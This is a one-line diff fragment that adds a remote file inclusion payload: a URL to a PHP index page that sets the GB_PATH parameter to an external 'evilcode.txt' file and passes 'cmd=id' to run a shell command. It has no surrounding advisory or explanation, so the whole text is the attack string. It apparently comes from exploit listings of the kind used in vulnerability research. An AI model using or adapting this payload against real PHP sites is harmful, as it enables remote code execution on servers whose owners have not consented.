@@ -1,0 +1,1 @@
+http://www.example.com/[scriptpath]/index.php?GB_PATH=evilcode.txt?&amp;cmd=id
